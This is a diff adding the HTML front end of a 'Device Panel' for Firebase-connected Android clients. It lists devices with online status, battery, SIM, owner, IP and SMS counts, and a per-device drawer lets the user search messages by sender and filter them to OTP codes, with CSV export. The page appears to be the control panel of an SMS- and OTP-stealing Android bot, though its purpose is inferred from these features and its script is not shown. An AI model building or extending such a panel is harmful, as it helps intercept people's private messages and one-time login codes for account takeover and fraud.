@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="color-scheme" content="dark" />
+  <title>Device Panel — axexodiweb</title>
+  <link rel="stylesheet" href="styles.css" />
+</head>
+<body>
+  <div class="app">
+    <header class="topbar">
+      <div class="brand">
+        <span class="logo" aria-hidden="true">▣</span>
+        <div>
+          <h1>Device Panel</h1>
+          <p class="sub">axexodiweb · Firebase clients</p>
+        </div>
+      </div>
+      <div class="top-actions">
+        <div class="meta" id="meta">Loading…</div>
+        <button type="button" class="btn ghost" id="refreshBtn" title="Reload data">↻ Refresh</button>
+      </div>
+    </header>
+
+    <section class="stats" id="stats" aria-live="polite"></section>
+
+    <section class="controls" role="search">
+      <div class="search-wrap">
+        <span class="search-ico" aria-hidden="true">⌕</span>
+        <input id="search" type="search" placeholder="Search tag, name, model, client ID, owner, IP, message…" autocomplete="off" />
+      </div>
+      <select id="fStatus" aria-label="Status">
+        <option value="">Status</option>
+        <option value="online">Online</option>
+        <option value="offline">Offline</option>
+      </select>
+      <select id="fAndroid" aria-label="Android version"><option value="">Android</option></select>
+      <select id="fSort" aria-label="Sort">
+        <option value="num">Sort · #tag</option>
+        <option value="messages">Sort · messages ↓</option>
+        <option value="name">Sort · name A–Z</option>
+        <option value="online">Sort · online first</option>
+        <option value="battery">Sort · battery</option>
+      </select>
+      <label class="chk"><input type="checkbox" id="fOwned" /> Owned</label>
+      <label class="chk"><input type="checkbox" id="fMsgs" /> Has SMS</label>
+      <label class="chk"><input type="checkbox" id="fSims" /> Has SIM</label>
+      <button type="button" class="btn" id="exportBtn">Export CSV</button>
+    </section>
+
+    <section class="table-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th>#</th>
+            <th>Device</th>
+            <th>Status</th>
+            <th>Android</th>
+            <th>Battery</th>
+            <th>SIM</th>
+            <th>SMS</th>
+            <th>Last message</th>
+            <th>Owner</th>
+            <th></th>
+          </tr>
+        </thead>
+        <tbody id="tbody"></tbody>
+      </table>
+      <p id="empty" class="empty" hidden>No devices match.</p>
+    </section>
+
+    <footer class="foot">
+      <span id="count"></span>
+      <span id="generated"></span>
+    </footer>
+  </div>
+
+  <div id="backdrop" class="backdrop" hidden></div>
+
+  <aside id="drawer" class="drawer" hidden aria-hidden="true" role="dialog" aria-modal="true" aria-labelledby="dTitle">
+    <header class="drawer-head">
+      <div class="drawer-ident">
+        <div class="drawer-tag" id="dTag"></div>
+        <h2 id="dTitle"></h2>
+        <div class="drawer-sub" id="dSub"></div>
+        <div class="drawer-badges" id="dBadges"></div>
+      </div>
+      <button type="button" class="icon-btn" id="dClose" aria-label="Close details">×</button>
+    </header>
+
+    <nav class="tabs" role="tablist">
+      <button type="button" class="tab active" data-tab="overview" role="tab">Overview</button>
+      <button type="button" class="tab" data-tab="sims" role="tab">SIMs</button>
+      <button type="button" class="tab" data-tab="info" role="tab">Info</button>
+      <button type="button" class="tab" data-tab="messages" role="tab">Messages</button>
+    </nav>
+
+    <div class="drawer-body">
+      <section id="tab-overview" class="tab-panel active" role="tabpanel"></section>
+      <section id="tab-sims" class="tab-panel" role="tabpanel" hidden></section>
+      <section id="tab-info" class="tab-panel" role="tabpanel" hidden></section>
+      <section id="tab-messages" class="tab-panel" role="tabpanel" hidden>
+        <div class="msg-toolbar">
+          <input id="msgSearch" type="search" placeholder="Search SMS, sender, OTP…" autocomplete="off" />
+          <select id="msgType" aria-label="Message type">
+            <option value="">All</option>
+            <option value="incoming">Incoming</option>
+            <option value="outgoing">Outgoing</option>
+            <option value="otp">OTP</option>
+          </select>
+          <span class="msg-count" id="msgCount"></span>
+        </div>
+        <div class="msg-list" id="msgList"><p class="empty">Loading…</p></div>
+      </section>
+    </div>
+  </aside>
+
+  <script src="app.js"></script>
+</body>
+</html>
